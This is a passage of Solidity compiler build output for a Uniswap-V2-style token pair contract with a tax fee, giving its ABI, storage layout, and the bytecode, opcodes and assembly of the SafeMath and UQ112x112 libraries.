\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getReserves\",\"outputs\":[{\"internalType\":\"uint112\",\"name\":\"_reserve0\",\"type\":\"uint112\"},{\"internalType\":\"uint112\",\"name\":\"_reserve1\",\"type\":\"uint112\"},{\"internalType\":\"uint32\",\"name\":\"_blockTimestampLast\",\"type\":\"uint32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token0\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token1\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_taxfee\",\"type\":\"uint256\"}],\"name\":\"initialize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"kLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price0CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price1CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"skim\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sync\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"taxfee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/Pair.sol\":\"Pair\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/ERC20.sol\":{\"keccak256\":\"0x59f3a9c274714d7b3493d7898f412eee5e2aa3df408df3a67134f5333112aaab\",\"urls\":[\"bzz-raw://45d02bb45a633b1dac3a8bb29be50cb07117f65e11a2c7214290a7d9e34c9688\",\"dweb:/ipfs/Qme3WmF8PrqUH7D9XggNYZEaHHR2nTLd2Ld7C14T68TgY3\"]},\"src/ICallee.sol\":{\"keccak256\":\"0xdd42904310b0f5d040eef9abb7b14327315f8437576e7fc7c1ea004130bf138a\",\"urls\":[\"bzz-raw://6377a208affde795cbdbd2024e38b1dd7ddabd51cc106974ad583d062a636de1\",\"dweb:/ipfs/QmNgMBbkfLbuf9yZSqY57HR5Nh8esYyGXgHNnSY2K1DsNe\"]},\"src/IERC20.sol\":{\"keccak256\":\"0xa45dab2f2a6e81dff31d7f62a0b0513ae09f7f01ee22d0970e2b532e2b14fad8\",\"urls\":[\"bzz-raw://5b5177e85ae0239a5d633ca2d83652b0fc63622f0bc317a3d32a3661f50d7537\",\"dweb:/ipfs/QmdV9Jp5icxxC3SYVVuwQTKXMcWicDToahxUxdkFCJC4M9\"]},\"src/IFactory.sol\":{\"keccak256\":\"0x69d7f0c32f305449132b97119efc9d382c41c027f7739e312fdf3ca6b0bfc64d\",\"urls\":[\"bzz-raw://63280eb6f4eef4de9934869aee43278c3c5d48255b6c2ed9e10e6e4a136aae0b\",\"dweb:/ipfs/QmazKfJnm2PcDVZjBYLAZPyDrmPSmEnuurAvc7mbTKymAj\"]},\"src/IPair.sol\":{\"keccak256\":\"0xdb92972f4ad91928bf2b838c35717718651f0501be334e6f30849c56fe99ff66\",\"urls\":[\"bzz-raw://e481899dee463be19aa61191acfef749034329127d372116ad504bad936f14e0\",\"dweb:/ipfs/QmeFYDk2NDiNjZt1yUDo8u1CuxYVdswc2mqWETaCzD1Cnv\"]},\"src/Math.sol\":{\"keccak256\":\"0x9e94097dd206ec6121005eb1e67e8347a2cfca90fb7d0b599522ce2f8a36c09b\",\"urls\":[\"bzz-raw://bfa9f239f212c94f413dc5ef4f5cabc853e789519bd9610a51fd7a2ea222d8fb\",\"dweb:/ipfs/QmR1YCU8VQ28BnqeRQ9WqSwqjxLzmtJYz2KqW2XQKjP9dR\"]},\"src/Pair.sol\":{\"keccak256\":\"0x1ef8b4855d24137258cef2a98f1baaeb7d4d62c34be32f9d5cc44449168e34b9\",\"urls\":[\"bzz-raw://fa3145bea6c4206c38cc8cfc03ecc508737e872e1156d726e342b74021945957\",\"dweb:/ipfs/QmazHqjZH3CFgpHybUTEjGyjqE5mSuexk1TTCnEUf4MuWD\"]},\"src/SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]},\"src/UQ112x112.sol\":{\"keccak256\":\"0x6e2290410379a33e837cbc6ff96ff5d983345daf2d824705b6f4b4c22ebc36a9\",\"urls\":[\"bzz-raw://d3dc93ec9e4b2d9da2f664930040f7b88c6364d40289ddfa911a4403ea05e783\",\"dweb:/ipfs/QmXcS8kvWMEBQbdu9JodRhY1yjomGG13KZpcAivd5x2NDH\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 19,
								"contract": "src/Pair.sol:Pair",
								"label": "totalSupply",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 23,
								"contract": "src/Pair.sol:Pair",
								"label": "balanceOf",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 29,
								"contract": "src/Pair.sol:Pair",
								"label": "allowance",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 33,
								"contract": "src/Pair.sol:Pair",
								"label": "_frozenBalance",
								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 35,
								"contract": "src/Pair.sol:Pair",
								"label": "DOMAIN_SEPARATOR",
								"offset": 0,
								"slot": "4",
								"type": "t_bytes32"
							},
							{
								"astId": 42,
								"contract": "src/Pair.sol:Pair",
								"label": "nonces",
								"offset": 0,
								"slot": "5",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 950,
								"contract": "src/Pair.sol:Pair",
								"label": "FeeResiver",
								"offset": 0,
								"slot": "6",
								"type": "t_address"
							},
							{
								"astId": 966,
								"contract": "src/Pair.sol:Pair",
								"label": "factory",
								"offset": 0,
								"slot": "7",
								"type": "t_address"
							},
							{
								"astId": 968,
								"contract": "src/Pair.sol:Pair",
								"label": "token0",
								"offset": 0,
								"slot": "8",
								"type": "t_address"
							},
							{
								"astId": 970,
								"contract": "src/Pair.sol:Pair",
								"label": "token1",
								"offset": 0,
								"slot": "9",
								"type": "t_address"
							},
							{
								"astId": 972,
								"contract": "src/Pair.sol:Pair",
								"label": "taxfee",
								"offset": 0,
								"slot": "10",
								"type": "t_uint256"
							},
							{
								"astId": 974,
								"contract": "src/Pair.sol:Pair",
								"label": "reserve0",
								"offset": 0,
								"slot": "11",
								"type": "t_uint112"
							},
							{
								"astId": 976,
								"contract": "src/Pair.sol:Pair",
								"label": "reserve1",
								"offset": 14,
								"slot": "11",
								"type": "t_uint112"
							},
							{
								"astId": 978,
								"contract": "src/Pair.sol:Pair",
								"label": "blockTimestampLast",
								"offset": 28,
								"slot": "11",
								"type": "t_uint32"
							},
							{
								"astId": 980,
								"contract": "src/Pair.sol:Pair",
								"label": "price0CumulativeLast",
								"offset": 0,
								"slot": "12",
								"type": "t_uint256"
							},
							{
								"astId": 982,
								"contract": "src/Pair.sol:Pair",
								"label": "price1CumulativeLast",
								"offset": 0,
								"slot": "13",
								"type": "t_uint256"
							},
							{
								"astId": 984,
								"contract": "src/Pair.sol:Pair",
								"label": "kLast",
								"offset": 0,
								"slot": "14",
								"type": "t_uint256"
							},
							{
								"astId": 987,
								"contract": "src/Pair.sol:Pair",
								"label": "unlocked",
								"offset": 0,
								"slot": "15",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint112": {
								"encoding": "inplace",
								"label": "uint112",
								"numberOfBytes": "14"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							},
							"t_uint32": {
								"encoding": "inplace",
								"label": "uint32",
								"numberOfBytes": "4"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/SafeMath.sol\":175:632  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/SafeMath.sol\":175:632  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a72315820791d34c1dd3fd396870b55e7cfd37bc8ac2ac8d570a8b3ee356685a64fa38e6e64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820791d34c1dd3fd396870b55e7cfd37bc8ac2ac8d570a8b3ee356685a64fa38e6e64736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 PUSH26 0x1D34C1DD3FD396870B55E7CFD37BC8AC2AC8D570A8B3EE356685 0xA6 0x4F LOG3 DUP15 PUSH15 0x64736F6C6343000510003200000000 ",
							"sourceMap": "175:457:7:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820791d34c1dd3fd396870b55e7cfd37bc8ac2ac8d570a8b3ee356685a64fa38e6e64736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 PUSH26 0x1D34C1DD3FD396870B55E7CFD37BC8AC2AC8D570A8B3EE356685 0xA6 0x4F LOG3 DUP15 PUSH15 0x64736F6C6343000510003200000000 ",
							"sourceMap": "175:457:7:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 175,
									"end": 632,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 175,
									"end": 632,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820791d34c1dd3fd396870b55e7cfd37bc8ac2ac8d570a8b3ee356685a64fa38e6e64736f6c63430005100032",
									".code": [
										{
											"begin": 175,
											"end": 632,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "ADDRESS"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "EQ"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/UQ112x112.sol": {
				"UQ112x112": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/UQ112x112.sol\":219:615  library UQ112x112 {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/UQ112x112.sol\":219:615  library UQ112x112 {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a7231582048159d829f67cb5d59fb56672d4a5af0bdd846a575b5fd60a3756ac8df920ba764736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a7231582048159d829f67cb5d59fb56672d4a5af0bdd846a575b5fd60a3756ac8df920ba764736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0x48 ISZERO SWAP14 DUP3 SWAP16 PUSH8 0xCB5D59FB56672D4A GAS CREATE 0xBD 0xD8 CHAINID 0xA5 PUSH22 0xB5FD60A3756AC8DF920BA764736F6C63430005100032 ",
							"sourceMap": "219:396:8:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a7231582048159d829f67cb5d59fb56672d4a5af0bdd846a575b5fd60a3756ac8df920ba764736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0x48 ISZERO SWAP14 DUP3 SWAP16 PUSH8 0xCB5D59FB56672D4A GAS CREATE 0xBD 0xD8 CHAINID 0xA5 PUSH22 0xB5FD60A3756AC8DF920BA764736F6C63430005100032 ",
							"sourceMap": "219:396:8:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"encode(uint112)": "infinite",
								"uqdiv(uint224,uint112)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 219,
									"end": 615,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 219,
									"end": 615,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a7231582048159d829f67cb5d59fb56672d4a5af0bdd846a575b5fd60a3756ac8df920ba764736f6c63430005100032",
									".code": [
										{
											"begin": 219,
											"end": 615,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "ADDRESS"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "EQ"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "DUP1"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/UQ112x112.sol\":\"UQ112x112\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/UQ112x112.sol\":{\"keccak256\":\"0x6e2290410379a33e837cbc6ff96ff5d983345daf2d824705b6f4b4c22ebc36a9\",\"urls\":[\"bzz-raw://d3dc93ec9e4b2d9da2f664930040f7b88c6364d40289ddfa911a4403ea05e783\",\"dweb:/ipfs/QmXcS8kvWMEBQbdu9JodRhY1yjomGG13KZpcAivd5x2NDH\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"src/ERC20.sol": {
				"ast": {
					"absolutePath": "src/ERC20.sol",
					"exportedSymbols": {
						"ERC20": [
							435
						]
					},
					"id": 436,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
